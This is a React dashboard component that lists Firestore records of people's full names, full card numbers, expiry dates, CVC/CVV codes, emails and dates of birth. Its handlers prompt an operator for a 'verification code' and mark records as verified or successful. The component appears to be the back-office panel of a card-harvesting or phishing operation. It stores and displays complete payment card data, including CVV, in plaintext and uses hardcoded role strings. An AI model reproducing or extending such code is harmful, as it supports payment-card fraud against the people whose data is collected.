import React, { useEffect, useRef, useState } from 'react'
import { FaUser, FaEnvelope, FaKey, FaDesktop, FaCode } from 'react-icons/fa';
import { MdAccessTime, MdAccessTimeFilled } from 'react-icons/md';
import { db } from '../config/firebase';
import { doc, onSnapshot, updateDoc } from 'firebase/firestore';
import { PiCaretDoubleLeftDuotone, PiCaretDoubleRightDuotone } from 'react-icons/pi';
import { toast } from 'react-toastify';
import { DateTime } from 'luxon';

const DashboardTable = ({ itemsObj, userData }) => {

  const ADMIN_ROLE_CODE = 'nahid$adminstrator$dashboard$root'
  const MANAGER_ROLE_CODE = 'nahid$manager$dashboard$'

  const allData = itemsObj?.slice()?.sort((a, b) => b?.createdAt - a?.createdAt)

  const role = userData?.role;

  const handleVerify = async (docId) => {
    const verifyCode = prompt('Enter the Verification Code.')
    try {
      const docRef = doc(db, 'data', docId)
      await updateDoc(docRef, {
        status: 'verify',
        code: verifyCode
      })
    } catch (error) {
      toast.error(error?.message)
    }
  }


  const handleSuccess = async (docId) => {
    try {
      const docRef = doc(db, 'data', docId)
      await updateDoc(docRef, {
        status: 'successful',
      })
      toast.success('Process Completed.')
    } catch (error) {
      toast.error(error?.message)
    }
  }


  const scrollDiv = useRef(null)


  const scrollToRightFunction = () => {
    scrollDiv.current.scrollTo({
      left: scrollDiv?.current?.scrollWidth,
      behavior: 'smooth'
    })
  }

  const scrollToLeftFunction = () => {
    scrollDiv.current.scrollTo({
      left: 0,
      behavior: 'smooth'
    })
  }


  return (
    <div className="min-h-screen bg-gray-50 w-full lg:px-8 md:px-5 px-3 space-y-5 py-5">

      <div className=' flex justify-center items-center text-3xl sm:text-4xl'>
        <div className='  flex justify-center items-center gap-4 cursor-default' >
          <PiCaretDoubleLeftDuotone className='text-blue-500 cursor-pointer hover:scale-125 transition-all' onClick={scrollToLeftFunction} />
          <h2 className=' text-slate-600'>Scroll</h2>
          <PiCaretDoubleRightDuotone className='text-blue-500 cursor-pointer hover:scale-125 transition-all' onClick={scrollToRightFunction} />
        </div>
      </div>

      <div className="overflow-x-scroll w-full hide-scrollbar " ref={scrollDiv}>
        <table className="w-full text-xs md:text-sm lg:text-lg bg-white shadow-lg rounded-lg mt-5 ">
          <thead>
            <tr className="bg-sky-700 text-white">
              <th className="px-4 py-3 text-left">#</th>
              <th className="px-4 py-3 text-left ">
                <div className=' flex items-center'>
                  <FaUser className="inline mr-1" />
                  Name
                </div>
              </th>

              <th className="px-4 py-3 text-left ">
                <div className=' flex items-center min-w-64'>
                  <FaEnvelope className="inline mr-1" />
                  Card Number
                </div>
              </th>
              <th className="px-4 py-3 text-left">
                <div className=' flex items-center min-w-40'>
                  <FaKey className="inline mr-1" />
                  Expiry Date
                </div>
              </th>
              <th className="px-4 py-3 text-left">
                <div className=' flex items-center min-w-40'>
                  <FaCode className="inline mr-1" />
                  CVC / CVV
                </div>
              </th>
              <th className="px-4 py-3 text-left ">
                <div className=' flex items-center'>
                  <FaUser className="inline mr-1" />
                  Email
                </div>
              </th>
              <th className="px-4 py-3 text-left">
                <div className=' flex items-center min-w-40'>
                  <MdAccessTimeFilled className="inline mr-1" />
                  Date Of Birth
                </div>
              </th>
              <th className="px-4 py-3 text-left">
                <div className=' flex items-center min-w-64'>
                  <FaKey className="inline mr-1" />
                  Date & Time
                </div>
              </th>
            </tr>
          </thead>
          <tbody className=' text-slate-600'>
            {allData && allData?.map((element, index) => (
              <tr
                key={element?.id}
                className={`border-t hover:bg-sky-100 ${index % 2 === 0 ? 'bg-sky-50' : ''
                  }`}
              >
                <td className="px-4 py-3 ">{index + 1}</td>

                <td className="px-4 py-3 ">{element?.fullName}</td>

                <td className="px-4 py-3 ">{element?.cardNumber}</td>
                <td className="px-4 py-3 ">{element?.expiryDate}</td>
                <td className="px-4 py-3 text-gray-600 ">{element?.cvv}</td>
                <td className="px-4 py-3 text-gray-600 ">{element?.emailAddress}</td>
                <td className="px-4 py-3 text-gray-600 ">{element?.dateOfBirth}</td>


                <td className="px-4 py-3 ">{element?.createdAt ? <div className=' flex flex-col gap-2 text-base font-semibold text-slate-600'>
                  <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('HH:mm:ss')}</div>
                  <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('dd-MM-yyyy')}</div>
                </div> : null} </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

export default DashboardTable